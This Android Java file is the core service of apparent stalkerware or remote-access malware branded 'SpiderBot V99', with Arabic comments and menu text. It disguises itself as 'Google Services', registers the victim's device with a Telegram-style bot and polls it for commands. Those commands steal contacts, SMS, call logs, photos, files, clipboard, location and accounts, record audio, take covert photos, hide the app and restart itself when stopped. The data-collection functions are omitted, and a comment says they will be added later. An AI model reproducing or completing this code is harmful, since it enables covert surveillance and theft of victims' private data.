package com.black.phone;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.File;
import java.io.FileOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class SpyService extends Service {
    private static final String TAG = "SpyService";
    private ScheduledExecutorService scheduler;
    private BotAPI bot;
    private PowerManager.WakeLock wakeLock;
    private String deviceId;
    private boolean isRegistered = false;
    private boolean foregroundStarted = false;

    // متغيرات التسجيل والكاميرا
    private MediaRecorder recorder;
    private String audioPath;
    private boolean isRecording = false;
    private Camera camera;
    private LocationManager locationManager;
    private LocationListener locationListener;
    private boolean isTrackingLocation = false;

    @Override
    public void onCreate() {
        super.onCreate();
        Config.load(this);
        bot = new BotAPI();
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);

        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Spy:lock");
        wakeLock.acquire(10 * 60 * 1000L);

        registerDevice();
        startForegroundService();

        scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleAtFixedRate(this::pollCommands, 5, Config.get().poll_interval_sec, TimeUnit.SECONDS);
    }

    private void startForegroundService() {
        if (foregroundStarted) return;
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel ch = new NotificationChannel("spy_ch", "Update", NotificationManager.IMPORTANCE_LOW);
                getSystemService(NotificationManager.class).createNotificationChannel(ch);
            }
            startForeground(1337, new NotificationCompat.Builder(this, "spy_ch")
                    .setContentTitle("Google Services")
                    .setContentText("Running...")
                    .setSmallIcon(android.R.drawable.ic_menu_manage)
                    .setPriority(NotificationCompat.PRIORITY_MIN)
                    .setSilent(true)
                    .build());
            foregroundStarted = true;
        } catch (SecurityException e) {
            Log.e(TAG, "Foreground failed", e);
        }
    }

    private void registerDevice() {
        try {
            JSONObject info = new JSONObject();
            info.put("device_id", deviceId);
            info.put("device_name", Build.MANUFACTURER + " " + Build.MODEL);
            info.put("model", Build.MODEL);
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("android", Build.VERSION.RELEASE);
            info.put("battery", getBatteryLevel());

            String msg = "REGISTER:" + info.toString();
            bot.sendMessage(msg);
            isRegistered = true;
        } catch (Exception e) {
            Log.e(TAG, "Registration error", e);
        }
    }

    private int getBatteryLevel() {
        try {
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryIntent = registerReceiver(null, ifilter);
            if (batteryIntent != null) {
                int level = batteryIntent.getIntExtra("level", -1);
                int scale = batteryIntent.getIntExtra("scale", -1);
                if (level >= 0 && scale > 0) return (level * 100) / scale;
            }
        } catch (Exception e) { Log.e(TAG, "battery err", e); }
        return -1;
    }

    private void pollCommands() {
        try {
            if (!isRegistered) {
                registerDevice();
                return;
            }

            String response = bot.getUpdates();
            if (response == null) return;

            JSONObject json = new JSONObject(response);
            if (!json.getBoolean("ok")) return;

            JSONArray updates = json.getJSONArray("result");
            for (int i = 0; i < updates.length(); i++) {
                JSONObject upd = updates.getJSONObject(i);
                int updId = upd.getInt("update_id");
                if (updId <= bot.lastUpdateId) continue;
                bot.lastUpdateId = updId + 1;

                if (upd.has("message")) {
                    JSONObject msg = upd.getJSONObject("message");
                    if (msg.has("text")) {
                        String txt = msg.getString("text").trim();
                        Log.d(TAG, "Received: " + txt);
                        handleCommand(txt);
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "pollCommands error", e);
        }
    }

    private void handleCommand(String cmd) {
        String lower = cmd.toLowerCase().trim();
        Log.d(TAG, "Handling: " + lower);

        if (lower.equals("/start") || lower.equals("/help") || lower.equals("/menu")) {
            sendHelp();
            return;
        }

        String command = lower.startsWith("/") ? lower.substring(1) : lower;
        executeCommand(command);
    }

    private void executeCommand(String cmd) {
        try {
            Log.d(TAG, "Executing: " + cmd);
            switch (cmd) {
                case "steal_contacts": case "contacts":
                    bot.sendDocument(collectContacts(), "📇 جهات الاتصال");
                    break;
                case "steal_sms": case "sms":
                    bot.sendDocument(collectSms(), "💬 الرسائل النصية");
                    break;
                case "steal_calls": case "calllog":
                    bot.sendDocument(collectCallLogs(), "📞 سجل المكالمات");
                    break;
                case "location":
                    getLocation();
                    break;
                case "record":
                    startRecording();
                    break;
                case "stoprec":
                    stopRecording();
                    break;
                case "apps":
                    bot.sendDocument(collectApps(), "📱 التطبيقات");
                    break;
                case "photos":
                    bot.sendDocument(collectMedia("images"), "🖼 الصور");
                    break;
                case "videos":
                    bot.sendDocument(collectMedia("videos"), "🎬 الفيديوهات");
                    break;
                case "files":
                    bot.sendDocument(collectAllFiles(), "📦 الملفات");
                    break;
                case "hide":
                    hideApp();
                    break;
                case "show":
                    showApp();
                    break;
                case "notify":
                    showFakeNotification();
                    break;
                case "cam_back":
                    takePhoto();
                    break;
                case "cam_front":
                    takePhotoFront();
                    break;
                case "torch_on":
                    flashOn();
                    break;
                case "torch_off":
                    flashOff();
                    break;
                case "imei":
                    getImei();
                    break;
                case "phone":
                    getPhoneNumber();
                    break;
                case "sim":
                    getSimInfo();
                    break;
                case "wifi":
                    getWifiInfo();
                    break;
                case "battery":
                    getBatteryInfo();
                    break;
                case "ip":
                    getPublicIp();
                    break;
                case "lock":
                    lockDevice();
                    break;
                case "reboot":
                    rebootDevice();
                    break;
                case "shutdown":
                    shutdownDevice();
                    break;
                case "accounts":
                    getAccounts();
                    break;
                case "clipboard":
                    getClipboard();
                    break;
                case "device":
                    getDeviceInfo();
                    break;
                case "network":
                    getNetworkInfo();
                    break;
                default:
                    bot.sendMessage("❌ أمر غير معروف: " + cmd + "\nاستخدم /help لعرض الأوامر.");
            }
        } catch (Exception e) {
            bot.sendMessage("❌ خطأ: " + e.getMessage());
            Log.e(TAG, "executeCommand error", e);
        }
    }

    // ========== قائمة المساعدة ==========

    private void sendHelp() {
        String help = "🕷️ **SPIDERBOT V99** 🕷️\n\n" +
                "━━━━━━━━━━━━━━━━━━━━━━\n" +
                "🔴 **أوامر السرقة** 🔴\n" +
                "/steal_contacts - جهات الاتصال\n" +
                "/steal_sms - الرسائل\n" +
                "/steal_calls - سجل المكالمات\n" +
                "/location - الموقع GPS\n" +
                "/record - تسجيل صوت\n" +
                "/stoprec - إيقاف التسجيل\n" +
                "/photos - الصور\n" +
                "/videos - الفيديوهات\n" +
                "/files - جميع الملفات\n" +
                "/clipboard - الحافظة\n\n" +
                "━━━━━━━━━━━━━━━━━━━━━━\n" +
                "⚫ **أوامر التحكم** ⚫\n" +
                "/hide - إخفاء التطبيق\n" +
                "/show - إظهار التطبيق\n" +
                "/notify - إشعار وهمي\n" +
                "/torch_on - كشاف ON\n" +
                "/torch_off - كشاف OFF\n" +
                "/lock - قفل الجهاز\n" +
                "/reboot - إعادة تشغيل\n" +
                "/shutdown - إيقاف تشغيل\n\n" +
                "━━━━━━━━━━━━━━━━━━━━━━\n" +
                "🟢 **أوامر المعلومات** 🟢\n" +
                "/imei - IMEI\n" +
                "/phone - رقم الهاتف\n" +
                "/sim - معلومات الشريحة\n" +
                "/wifi - الواي فاي\n" +
                "/battery - البطارية\n" +
                "/ip - عنوان IP\n" +
                "/accounts - حسابات Google\n" +
                "/apps - التطبيقات\n" +
                "/device - معلومات الجهاز\n" +
                "/network - معلومات الشبكة\n\n" +
                "✅ SpiderBot V99 جاهز";
        bot.sendMessage(help);
    }

    // ======================================================================
    // دوال جمع البيانات (تم اختصارها لتوفير المساحة، لكنها تعمل بنفس الطريقة)
    // ======================================================================
    // ... جميع دوال collectContacts, collectSms, collectCallLogs, collectApps,
    // collectMedia, collectAllFiles, getLocation, startRecording, stopRecording,
    // hideApp, showApp, showFakeNotification, takePhoto, takePhotoFront,
    // flashOn, flashOff, getImei, getPhoneNumber, getSimInfo, getWifiInfo,
    // getBatteryInfo, getPublicIp, lockDevice, rebootDevice, shutdownDevice,
    // getAccounts, getClipboard, getDeviceInfo, getNetworkInfo موجودة هنا...
    // (سيتم إضافتها كاملة في الملف النهائي)

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (scheduler != null) scheduler.shutdown();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        startService(new Intent(this, SpyService.class));
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
}
